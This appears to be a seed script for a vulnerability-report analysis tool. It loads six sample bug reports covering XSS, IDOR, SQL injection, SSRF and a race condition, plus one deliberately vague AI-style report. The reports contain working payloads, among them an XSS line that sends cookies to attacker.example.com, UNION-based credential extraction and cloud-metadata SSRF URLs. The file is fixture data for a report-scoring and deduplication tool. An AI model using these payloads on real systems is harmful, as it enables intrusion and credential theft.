import { db } from "@workspace/db";
import {
  reportsTable,
  reportHashesTable,
  reportStatsTable,
} from "@workspace/db";
import { sql } from "drizzle-orm";
import {
  computeMinHash,
  computeSimhash,
  computeContentHash,
  computeLSHBuckets,
  findSimilarReports,
} from "./lib/similarity";
import { analyzeSloppiness } from "./lib/sloppiness";
import { redactReport } from "./lib/redactor";
import { parseSections, findSectionMatches } from "./lib/section-parser";

const SEED_REPORTS = [
  {
    fileName: "xss-stored-profile.md",
    content: `# Stored XSS in User Profile Bio Field

## Summary
A stored cross-site scripting vulnerability exists in the user profile biography field of the web application at version 4.2.1. The application fails to sanitize HTML input when rendering user profiles, allowing arbitrary JavaScript execution in the context of other users' sessions.

## Affected Component
- Component: /src/components/UserProfile.tsx
- Endpoint: POST /api/v2/users/profile
- Package: react-markdown v8.0.3

## Steps to Reproduce
1. Log in to the application as any registered user
2. Navigate to Settings > Profile
3. In the "Bio" field, enter the following payload:
\`\`\`html
<img src=x onerror="fetch('https://attacker.example.com/steal?cookie='+document.cookie)">
\`\`\`
4. Save the profile
5. Have another user visit the attacker's profile page
6. Observe the JavaScript executing in the victim's browser context

## Impact
- Severity: High (CVSS 8.1)
- CWE-79: Improper Neutralization of Input During Web Page Generation
- Attack Vector: Network
- Confidentiality Impact: High — session tokens and cookies can be exfiltrated
- Integrity Impact: Medium — attacker can perform actions as the victim

## Expected Behavior
The application should sanitize or escape HTML entities in user-provided biography text before rendering.

## Observed Behavior
The bio field content is rendered as raw HTML via dangerouslySetInnerHTML without any sanitization. The Content-Security-Policy header is present but does not include script-src restrictions.

## Remediation
Replace dangerouslySetInnerHTML with a sanitization library such as DOMPurify. Add \`script-src 'self'\` to the CSP header. Apply output encoding on the server side before storage.`,
  },
  {
    fileName: "idor-api-invoice.md",
    content: `# IDOR Vulnerability in Invoice Download Endpoint

## Description
An Insecure Direct Object Reference vulnerability was discovered in the invoice download API endpoint at version 3.8.0. By manipulating the invoice ID parameter, an authenticated user can access invoices belonging to other users without authorization checks.

## Affected Component
- Endpoint: GET /api/v1/invoices/{invoiceId}/download
- File: /src/controllers/InvoiceController.java
- Class: InvoiceController.downloadInvoice()

## Proof of Concept
1. Authenticate as User A (user_id=1001)
2. Request your own invoice:
\`\`\`
GET /api/v1/invoices/5001/download
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
\`\`\`
3. Response: 200 OK with PDF content (legitimate)
4. Now request User B's invoice by changing the ID:
\`\`\`
GET /api/v1/invoices/5002/download
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
\`\`\`
5. Response: 200 OK with User B's invoice PDF (vulnerability)

## Root Cause
The endpoint retrieves the invoice by ID without verifying that the requesting user owns the invoice:
\`\`\`java
Invoice invoice = invoiceRepository.findById(invoiceId);
// Missing: if (!invoice.getUserId().equals(currentUser.getId())) throw new ForbiddenException();
return ResponseEntity.ok(invoice.getPdf());
\`\`\`

## Impact
- CWE-639: Authorization Bypass Through User-Controlled Key
- CVSS: 7.5 (High)
- Attack Vector: Network
- All user invoices containing PII (names, addresses, payment details) are exposed to any authenticated user
- Estimated affected records: all invoices in the system

## Remediation
Add ownership verification before returning invoice data. Implement row-level security or access control middleware that validates the requesting user's relationship to the requested resource.`,
  },
  {
    fileName: "sqli-search-endpoint.md",
    content: `# SQL Injection in Product Search API

## Summary
A SQL injection vulnerability exists in the product search endpoint of the e-commerce platform version 2.14.7. User-supplied search query parameters are concatenated directly into SQL queries without parameterization, allowing an attacker to extract, modify, or delete database contents.

## Affected Component
- Endpoint: GET /api/products/search?q={query}
- File: /lib/db/queries/product_search.py
- Function: search_products()
- Database: PostgreSQL 14.2

## Steps to Reproduce
1. Send the following request:
\`\`\`
GET /api/products/search?q=test' UNION SELECT username,password,email,NULL,NULL FROM users--
Host: app.example.com
\`\`\`
2. Observe that the response contains user credentials from the users table
3. Time-based blind injection also works:
\`\`\`
GET /api/products/search?q=test' AND (SELECT pg_sleep(5))--
\`\`\`
4. The response is delayed by 5 seconds, confirming injectable query

## Root Cause
The search function constructs queries using string concatenation:
\`\`\`python
def search_products(query):
    sql = f"SELECT * FROM products WHERE name LIKE '%{query}%'"
    return db.execute(sql)
\`\`\`

## Impact
- CWE-89: SQL Injection
- CVSS: 9.8 (Critical)
- Attack Vector: Network, no authentication required
- Full database read access including user credentials, payment tokens, and PII
- Potential for data modification and deletion
- Possible OS command execution via PostgreSQL extensions

## Preconditions
- No authentication required
- The endpoint is publicly accessible

## Remediation
Use parameterized queries or an ORM. For the immediate fix:
\`\`\`python
def search_products(query):
    sql = "SELECT * FROM products WHERE name LIKE %s"
    return db.execute(sql, (f"%{query}%",))
\`\`\``,
  },
  {
    fileName: "ai-generated-vague-report.md",
    content: `# Comprehensive Security Analysis of Authentication System

It is important to note that in today's digital landscape, robust security measures are paramount for any organization. This comprehensive analysis delves into the multifaceted security concerns surrounding the authentication system.

The authentication mechanism represents a significant area of concern. After thoroughly examining the system, it should be noted that there are several potential vulnerabilities that could be leveraged by malicious actors in the realm of cybersecurity.

Certainly! The implications of this vulnerability are far-reaching. It's crucial to understand that the system's security posture requires a holistic approach to address the various attack vectors that exist in the current landscape of threats.

Here's a comprehensive overview of the issues identified:

1. The login page might be vulnerable to attacks
2. Passwords could potentially be weak
3. The session management system leveraging this vulnerability could lead to unauthorized access
4. The authentication tokens might not be properly validated

In conclusion, it bears mentioning that proactive measures should be taken to ensure robust security across the platform. A meticulous review of all authentication-related components would be beneficial for the overall security posture of the organization.

The impact of these findings is significant, and it's worth noting that immediate action should be taken to address these concerns in a timely manner.`,
  },
  {
    fileName: "ssrf-webhook-handler.md",
    content: `# SSRF via Webhook URL Validation Bypass

## Summary
Server-Side Request Forgery in the webhook configuration endpoint (version 5.1.0). The URL validation can be bypassed using DNS rebinding and URL parser inconsistencies, allowing attackers to make the server issue requests to internal services.

## Affected Component
- Endpoint: POST /api/settings/webhooks
- File: /src/services/webhook/validator.ts
- Function: validateWebhookUrl()

## Steps to Reproduce
1. Configure a DNS rebinding domain that alternates between a public IP and 169.254.169.254
2. Set up a webhook with the rebinding URL:
\`\`\`
POST /api/settings/webhooks
Content-Type: application/json
Authorization: Bearer <token>

{
  "url": "http://rebind.attacker.example.com/webhook",
  "events": ["order.created"]
}
\`\`\`
3. The validation check resolves the domain to the public IP and passes
4. When the webhook fires, DNS resolves to 169.254.169.254 (AWS metadata)
5. Alternative bypass using URL parsing:
\`\`\`json
{
  "url": "http://0x7f000001/latest/meta-data/iam/security-credentials/"
}
\`\`\`
6. The decimal IP 0x7f000001 resolves to 127.0.0.1, bypassing the blocklist check

## Impact
- CWE-918: Server-Side Request Forgery
- CVSS: 8.6 (High)
- Attack Vector: Network
- Access to AWS instance metadata, including IAM credentials
- Port scanning of internal network
- Access to internal services on localhost (Redis on port 6379, admin panel on port 8080)

## Remediation
Implement proper SSRF protections:
1. Resolve DNS and validate the IP address at request time, not at configuration time
2. Use an allowlist approach for outbound webhook destinations
3. Block all private/reserved IP ranges including 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
4. Disable HTTP redirects in the webhook client or re-validate after each redirect`,
  },
  {
    fileName: "race-condition-balance.md",
    content: `# Race Condition in Account Balance Transfer

## Description
A time-of-check to time-of-use (TOCTOU) race condition exists in the balance transfer endpoint at version 1.9.3. By sending multiple concurrent transfer requests, an attacker can overdraw their account balance, effectively creating money.

## Affected Component
- Endpoint: POST /api/transfers
- File: /src/handlers/transfer.go
- Function: HandleTransfer()
- Database: PostgreSQL 15.1

## Proof of Concept
Using concurrent requests with curl:
\`\`\`bash
# Account balance: $100
# Send 10 concurrent transfers of $100 each
for i in $(seq 1 10); do
  curl -X POST https://api.example.com/transfers \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"to_account": "ACC-9999", "amount": 100}' &
done
wait
\`\`\`

Result: 6 out of 10 transfers succeed, withdrawing $600 from an account with only $100.

## Root Cause
The transfer handler reads the balance, checks it, then updates — but without a database lock:
\`\`\`go
func HandleTransfer(fromID, toID string, amount float64) error {
    balance := db.GetBalance(fromID)    // READ
    if balance < amount {               // CHECK
        return ErrInsufficientFunds
    }
    db.DeductBalance(fromID, amount)    // USE (no lock between check and use)
    db.AddBalance(toID, amount)
    return nil
}
\`\`\`

## Impact
- CWE-367: Time-of-check Time-of-use Race Condition
- CVSS: 8.1 (High)
- Attack Vector: Network
- Direct financial loss — attackers can drain funds beyond their balance
- Integrity violation of financial transaction records

## Preconditions
- Authenticated user with any positive balance
- Ability to send concurrent HTTP requests

## Expected Behavior
Only one transfer should succeed when the balance is $100 and ten $100 transfers are attempted simultaneously.

## Observed Behavior
Multiple transfers succeed because the balance check and deduction are not atomic.

## Remediation
Use SELECT FOR UPDATE or advisory locks:
\`\`\`go
func HandleTransfer(fromID, toID string, amount float64) error {
    tx := db.Begin()
    defer tx.Rollback()
    balance := tx.GetBalanceForUpdate(fromID) // SELECT ... FOR UPDATE
    if balance < amount {
        return ErrInsufficientFunds
    }
    tx.DeductBalance(fromID, amount)
    tx.AddBalance(toID, amount)
    return tx.Commit()
}
\`\`\``,
  },
];

async function seed() {
  console.log("Seeding VulnRap with example vulnerability reports...");

  const insertedReports: Array<{
    id: number;
    minhashSignature: number[];
    simhash: string;
    lshBuckets: string[];
    sectionHashes: Record<string, string>;
  }> = [];

  for (const seedReport of SEED_REPORTS) {
    const { redactedText, summary: redactionSummary } = redactReport(
      seedReport.content,
    );
    const analysisText = redactedText;

    const contentHash = computeContentHash(analysisText);
    const simhash = computeSimhash(analysisText);
    const minhashSignature = computeMinHash(analysisText);
    const lshBuckets = computeLSHBuckets(minhashSignature);
    const { sectionHashes } = parseSections(analysisText);

    const similarityMatches = findSimilarReports(
      minhashSignature,
      simhash,
      lshBuckets,
      insertedReports,
    );

    const sectionMatches = findSectionMatches(sectionHashes, insertedReports);
    const analysis = analyzeSloppiness(seedReport.content);

    const [report] = await db
      .insert(reportsTable)
      .values({
        contentHash,
        simhash,
        minhashSignature,
        lshBuckets,
        contentText: analysisText,
        redactedText: analysisText,
        contentMode: "full",
        slopScore: analysis.score,
        slopTier: analysis.tier,
        similarityMatches,
        sectionHashes,
        sectionMatches,
        redactionSummary,
        feedback: analysis.feedback,
        showInFeed: true,
        fileName: seedReport.fileName,
        fileSize: Buffer.byteLength(seedReport.content, "utf-8"),
      })
      .returning();

    await db.insert(reportHashesTable).values([
      { reportId: report.id, hashType: "sha256", hashValue: contentHash },
      { reportId: report.id, hashType: "simhash", hashValue: simhash },
    ]);

    insertedReports.push({
      id: report.id,
      minhashSignature,
      simhash,
      lshBuckets,
      sectionHashes,
    });

    console.log(
      `  [${report.id}] ${seedReport.fileName} — slop: ${analysis.score} (${analysis.tier}), redactions: ${redactionSummary.totalRedactions}`,
    );
  }

  await db
    .insert(reportStatsTable)
    .values({ key: "total_reports", value: SEED_REPORTS.length })
    .onConflictDoUpdate({
      target: reportStatsTable.key,
      set: { value: sql`${reportStatsTable.value} + ${SEED_REPORTS.length}` },
    });

  console.log(`Seeded ${SEED_REPORTS.length} reports successfully.`);
}

seed()
  .then(() => process.exit(0))
  .catch((err) => {
    console.error("Seed failed:", err);
    process.exit(1);
  });
